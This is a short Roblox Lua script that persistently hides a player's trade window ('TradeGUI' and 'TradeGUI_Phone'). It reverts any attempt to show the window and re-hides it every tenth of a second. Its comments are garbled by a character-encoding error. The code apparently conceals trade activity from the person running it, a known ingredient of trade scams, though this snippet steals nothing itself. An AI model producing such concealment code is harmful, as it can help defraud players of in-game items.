-- ÐÐ¾Ð²Ð°Ñ ÑƒÐ»ÑƒÑ‡ÑˆÐµÐ½Ð½Ð°Ñ Ñ„ÑƒÐ½ÐºÑ†Ð¸Ñ ÑÐºÑ€Ñ‹Ñ‚Ð¸Ñ TradeGUI
local function setupTradeGUIHider()
    local player = game:GetService("Players").LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    local function hideTradeGUI()
        for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
            local gui = playerGui:FindFirstChild(guiName)
            if gui then
                gui.Enabled = false
                -- Ð”Ð²Ð¾Ð¹Ð½Ð°Ñ Ð·Ð°Ñ‰Ð¸Ñ‚Ð°: Ð¾Ñ‚ÐºÐ»ÑŽÑ‡Ð°ÐµÐ¼ Ð¸Ð·Ð¼ÐµÐ½ÐµÐ½Ð¸Ðµ Enabled
                if not gui:FindFirstChild("AntiFlash") then
                    local conn
                    conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                        if gui.Enabled then
                            gui.Enabled = false
                        else
                            conn:Disconnect()
                        end
                    end)
                    local anti = Instance.new("BoolValue")
                    anti.Name = "AntiFlash"
                    anti.Parent = gui
                end
            end
        end
    end

    -- Ð¡ÐºÑ€Ñ‹Ð²Ð°ÐµÐ¼ ÑÑ€Ð°Ð·Ñƒ Ð¿Ñ€Ð¸ Ð·Ð°Ð¿ÑƒÑÐºÐµ
    hideTradeGUI()

    -- ÐžÑ‚ÑÐ»ÐµÐ¶Ð¸Ð²Ð°ÐµÐ¼ Ð¿Ð¾ÑÐ²Ð»ÐµÐ½Ð¸Ðµ Ð½Ð¾Ð²Ñ‹Ñ… Ð¾ÐºÐ¾Ð½
    playerGui.ChildAdded:Connect(function(child)
        if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
            hideTradeGUI()
        end
    end)

    -- ÐŸÐµÑ€Ð¸Ð¾Ð´Ð¸Ñ‡ÐµÑÐºÐ°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ°
    while true do
        hideTradeGUI()
        task.wait(0.1)
    end
end

